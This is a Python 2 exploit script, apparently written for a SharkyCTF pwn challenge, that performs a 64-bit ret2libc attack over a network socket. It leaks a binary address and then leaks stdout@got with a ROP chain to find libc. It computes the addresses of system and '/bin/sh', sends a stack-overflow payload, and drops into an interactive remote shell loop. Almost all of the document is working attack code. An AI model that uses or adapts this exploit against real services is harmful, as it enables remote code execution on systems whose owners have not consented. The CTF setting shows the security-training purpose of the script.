#!/usr/bin/env python

import socket,sys


'''
```
21   *           dummy bytes      dummy bytes     dummy     arg1 for system()
22   *           /                 /			   /			/
23   * |------------------|---------|------------|------|------------------|
24   * | buffer_fill_up   |  AAAA   |  &system   | BBBB |addr of "/bin/sh" |
25   * |------------------|---------|------------|------|------------------|
26   *     buffer          saved-EBP      RET
27   *
28   *
```

THAT, BUT 64 BITS!!!!

'''


def pad_addr(addr):
	print "padding %i 0s" % (16 - len(addr))
	return "0"*(16 - len(addr)) + addr

offset = 40

s=socket.socket()
# sharkyctf.xyz
s.connect((sys.argv[1],20335))

mainaddr = s.recv(1024).split(': ')[1].lstrip('0x').strip()


if len(mainaddr) < 16:
	print "padding %i 0s" % (16 - len(mainaddr))
	mainaddr = "0"*(16 - len(mainaddr)) + mainaddr

print "main:", mainaddr

# 0x2a4191f1401c (inconsistent offset)

# sysaddr = int(mainaddr, 16) + 0x2aaaa28e4018 
# sysaddr	= hex(sysaddr).lstrip('0x')
# print "sysaddr:", sysaddr
# sysaddr = sysaddr.decode('hex')[::-1] # ?? big/small endian?


leakrop = int(mainaddr, 16) + 21
leakrop	= hex(leakrop).lstrip('0x')
leakrop = pad_addr(leakrop)
print "leakrop:", leakrop
leakrop = leakrop.decode('hex')[::-1]


mainprintf = pad_addr(hex(int(mainaddr, 16) + 33).lstrip('0x'))
print "leakrop:", mainprintf
mainprintf = mainprintf.decode('hex')[::-1]


#0x0000000000000901 : pop rsi ; pop r15 ; ret
poprsi = int(mainaddr, 16) + 157
poprsi	= hex(poprsi).lstrip('0x')
poprsi = pad_addr(poprsi)
print "poprsi:", poprsi
poprsi = poprsi.decode('hex')[::-1]

#0x0000000000000903 : pop rdi ; ret # we dont rlly need this
poprdi = int(mainaddr, 16) + 159
poprdi	= hex(poprdi).lstrip('0x')
poprdi = pad_addr(poprdi)
print "poprdi:", poprdi
poprdi = poprdi.decode('hex')[::-1]


# 0x0000000000000676 : ret // c3   --------- main-494
poprsi = int(mainaddr, 16) + 157
ret = poprsi - (0x901 - 0x676)
ret	= hex(ret).lstrip('0x')
ret = pad_addr(ret)
print "ret:", ret
ret = ret.decode('hex')[::-1]



stdoutgot = int(mainaddr, 16) + 2099132
stdoutgot = hex(stdoutgot).lstrip('0x')
stdoutgot = pad_addr(stdoutgot)
print "stdout@got:", stdoutgot
stdoutgot = stdoutgot.decode('hex')[::-1]


print '----------------------------------------'

# 0x0000000000000710 : pop rbp ; ret // 5dc3  = main - 340
poprbp = pad_addr(hex(int(mainaddr, 16) + 157 - (0x901-0x710)).lstrip('0x'))
print "poprbp:", poprbp
poprbp = poprbp.decode('hex')[::-1]



# 0x0000000000000902 : pop r15 ; ret // 415fc3


# print mainaddr.encode('hex')

# libc_diff = 1326550 + 5 - 12033 - 11 # ->/bin/sh

'''
system: f7e16200
binsh: 0xf7f59fd2
ready?
cmd $ //////////bin/ls
sh: 1: roadcast: not found

'''

# binsh = hex(int(sysaddr[::-1].encode('hex'), 16) + libc_diff)
# print "binsh:", binsh
# binsh = binsh[2::].decode('hex')[::-1]


#--------------------------- ready block ----------------------------------

raw_input("ready? ")

#--------------------------------------------------------------------------

# s.send("A" * offset + poprsi + leakrop + "\n")

dummy = "a"*8


# for i in range(30):

s.send("A" * offset + poprdi + stdoutgot + mainprintf + "\n")

secondleak = s.recv(1024)#.split(': ')[1].lstrip('0x').strip()
#secondleak = pad_addr(secondleak)
secondleak = pad_addr(secondleak[::-1].encode('hex'))
print "leak: ", secondleak


# s.send("A" * offset + dummy + poprsi + dummy + leakrop + "\n")
# # leak3 = pad_addr(s.recv(1024).split(': ')[1].lstrip('0x').strip())
# leak3 = s.recv(1024)
# print "leak 3:", leak3


# s.send("A" * offset + poprsi + leakrop + "\n")

# leak4 = s.recv(1024)
# print "leak 4:", leak4

# leaked addr in (libc) file: 0x3eba00
# system in file: 0x04f440
# /bin/sh in file: 0x1b3a00

file_leaked_addr = 0x3eba83
file_system_addr = 0x04f440
file_binsh_addr  = 0x1b3e9a
file_puts_addr   = 0x0809c0


system = int(secondleak, 16) - 3789600	# might be different in remote sys
sysaddr = system
system	= hex(system).lstrip('0x')
system = pad_addr(system)
print "system:", system
system = system.decode('hex')[::-1]

binsh = hex(sysaddr - (file_system_addr - file_binsh_addr)).lstrip('0x')
binsh = pad_addr(binsh)
print "binsh:", binsh
binsh = binsh.decode('hex')[::-1]

# ---------------------------------------------------------------------


# s.send("A" * offset + poprsi + leakrop + "\n")
# s.send("A" * offset + system + binsh + "\n")

s.send("A"*offset + ret + poprdi + binsh + system + "\n")

s.send("\n")
print 'final payload sent.'
# print s.recv(1024)


while 1:
	s.send(raw_input("cmd $ ")+"\n")
	print s.recv(1024)


